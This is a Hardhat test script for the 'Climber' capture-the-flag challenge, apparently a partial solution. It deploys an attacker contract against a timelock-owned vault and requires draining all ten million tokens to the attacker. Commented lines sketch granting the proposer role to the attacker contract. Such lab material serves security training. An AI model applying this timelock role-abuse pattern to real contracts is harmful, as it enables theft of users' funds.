const {ethers, upgrades} = require("hardhat");
const {expect} = require("chai");

describe("[Challenge] Climber", function () {
  let deployer, proposer, sweeper, attacker;

  // Vault starts with 10 million tokens
  const VAULT_TOKEN_BALANCE = ethers.utils.parseEther("10000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

    await ethers.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x16345785d8a0000", // 0.1 ETH
    ]);
    expect(await ethers.provider.getBalance(attacker.address)).to.equal(ethers.utils.parseEther("0.1"));

    // Deploy the vault behind a proxy using the UUPS pattern,
    // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
    this.vault = await upgrades.deployProxy(
      await ethers.getContractFactory("ClimberVault", deployer),
      [deployer.address, proposer.address, sweeper.address],
      {kind: "uups"}
    );

    expect(await this.vault.getSweeper()).to.eq(sweeper.address);
    expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt("0");
    expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
    expect(await this.vault.owner()).to.not.eq(deployer.address);

    // Instantiate timelock
    let timelockAddress = await this.vault.owner();
    this.timelock = await (await ethers.getContractFactory("ClimberTimelock", deployer)).attach(timelockAddress);

    // Ensure timelock roles are correctly initialized
    expect(await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)).to.be.true;
    expect(await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)).to.be.true;

    // Deploy token and transfer initial token balance to the vault
    this.token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy();
    await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    // Deploy attacker contract
    this.climberAttack = await (
      await ethers.getContractFactory("ClimberAttack", attacker)
    ).deploy(this.timelock.address, this.vault.address, this.token.address);
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    // Cannot reinitialise contract
    await expect(this.vault.initialize(deployer.address, proposer.address, sweeper.address)).to.be.revertedWith(
      "Initializable: contract is already initialized"
    );
    // timelock is owner of vault contract
    expect(await this.vault.owner()).to.eq(this.timelock.address);

    // let values = [0, 0, 0, 0, 0];
    // const salt = "0x0000000000000000000000009612157E5457e571083CeB9C4c5896e906df1111";

    // construct ownership change data
    // let target_0 = this.timelock.address;
    // const PROPOSER_ROLE = await this.timelock.PROPOSER_ROLE();
    // const signature_0 = "grantRole(bytes32,address)";
    // const parameters_0 = [PROPOSER_ROLE, this.climberAttack.address];
    // const encodedData_0 = ITimelock.encodeFunctionData(signature_0, parameters_0);
    await this.climberAttack.executeProposal();
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await this.token.balanceOf(this.vault.address)).to.eq("0");
    expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
  });
});
